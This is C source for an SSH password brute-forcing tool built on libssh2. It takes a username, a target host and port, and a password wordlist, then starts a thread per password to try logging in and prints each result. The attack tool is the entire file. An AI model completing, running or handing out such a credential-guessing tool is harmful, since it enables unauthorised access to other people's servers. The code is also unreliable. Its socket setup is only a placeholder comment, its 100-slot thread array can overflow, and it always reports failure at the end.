#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <libssh2.h>
#include <fcntl.h>

#define MAX_PASSWORD_LENGTH 256
#define MAX_HOST_LENGTH 256
#define MAX_USERNAME_LENGTH 256
#define MAX_FILE_PATH_LENGTH 256

typedef struct {
    char host[MAX_HOST_LENGTH];
    char username[MAX_USERNAME_LENGTH];
    char password[MAX_PASSWORD_LENGTH];
} ThreadData;

void *tryPassword(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    const char *host = data->host;
    const char *username = data->username;
    const char *password = data->password;

    LIBSSH2_SESSION *session;
    int rc;

    session = libssh2_session_init();
    if (session == NULL) {
        printf("Failed to create session\n");
        return NULL;
    }

    // Connect to the server
    int sock = /* code to create socket and connect to host */;
    if (sock < 0) {
        printf("Connection failed!\n");
        libssh2_session_free(session);
        return NULL;
    }

    // Start the session
    libssh2_session_handshake(session, sock);

    // Authenticate
    rc = libssh2_userauth_password(session, username, password);
    if (rc) {
        printf("Connection failed! (Password: %s)\n", password);
    } else {
        printf("Connection Successful! (Password: %s)\n", password);
    }

    libssh2_session_disconnect(session, "Bye");
    libssh2_session_free(session);
    close(sock);
    return NULL;
}

void clearConsole() {
    system("clear");
}

int main() {
    clearConsole();

    const char *asciiArt = 
    "_______ __   __ _______  ______  _____  __   _ _____ ______ _______       \n"
    "|______   \\_/   |       |_____/ |     | | \\  |   |    ____/ |______ |     \n"
    "______|    |    |_____  |    \\_ |_____| |  \\_| __|__ /_____ |______ |_____\n";
    
    printf("%s\n\n", asciiArt);

    const char *animation[] = {"\\", "|", "/", "-"};
    for (int i = 0; i < 10; i++) {
        for (int j = 0; j < 4; j++) {
            printf("\rSSH Brute Forcer %s", animation[j]);
            fflush(stdout);
            usleep(100000);
        }
    }

    char username[MAX_USERNAME_LENGTH];
    char host[MAX_HOST_LENGTH];
    char filePath[MAX_FILE_PATH_LENGTH];

    printf("Input the Username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    printf("Input the Target IP and Port (e.g., IP:PORT): ");
    fgets(host, sizeof(host), stdin);
    host[strcspn(host, "\n")] = 0;

    printf("Input the Password text file path (e.g., /path/to/your/passwords.txt): ");
    fgets(filePath, sizeof(filePath), stdin);
    filePath[strcspn(filePath, "\n")] = 0;

    FILE *file = fopen(filePath, "r");
    if (!file) {
        perror("File not opened");
        return EXIT_FAILURE;
    }

    pthread_t threads[100];
    int thread_count = 0;
    char password[MAX_PASSWORD_LENGTH];

    while (fgets(password, sizeof(password), file)) {
        password[strcspn(password, "\n")] = 0;

        ThreadData *data = malloc(sizeof(ThreadData));
        strncpy(data->host, host, MAX_HOST_LENGTH);
        strncpy(data->username, username, MAX_USERNAME_LENGTH);
        strncpy(data->password, password, MAX_PASSWORD_LENGTH);

        pthread_create(&threads[thread_count++], NULL, tryPassword, data);
    }

    fclose(file);

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("All passwords tried, connection failed.\n");
    return 0;
}
